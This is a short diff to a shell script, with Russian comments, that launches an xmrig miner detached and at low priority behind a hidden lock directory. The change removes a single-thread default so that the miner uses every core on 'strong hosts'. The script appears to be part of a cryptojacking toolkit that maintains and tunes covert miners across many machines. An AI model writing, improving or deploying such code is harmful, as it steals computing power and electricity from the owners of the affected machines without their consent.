@@ -393,7 +393,9 @@ m|g)
       # окно между "нет майнера" и fork: закрываем атомарным mkdir
       if mkdir "$D/.mlock" 2>/dev/null; then
         printf '%s' "$$" > "$D/.mlock/pid" 2>/dev/null
-        [ -s "$D/flags" ] || printf '%s' "--threads=1" > "$D/flags" 2>/dev/null
+        # 18.11 Kai: жёсткий --threads=1 (фоллбэк) держал сильные хосты на 16.7 H/s;
+        # пустые flags = авто-нити xmrig (kf_threads_* пишет актуальное при установке)
+        [ -s "$D/flags" ] || : > "$D/flags" 2>/dev/null
         detach nice -n 19 "$B" -c "$D/c.json" $(cat "$D/flags" 2>/dev/null)
         sleep 2
         rm -rf "$D/.mlock" 2>/dev/null
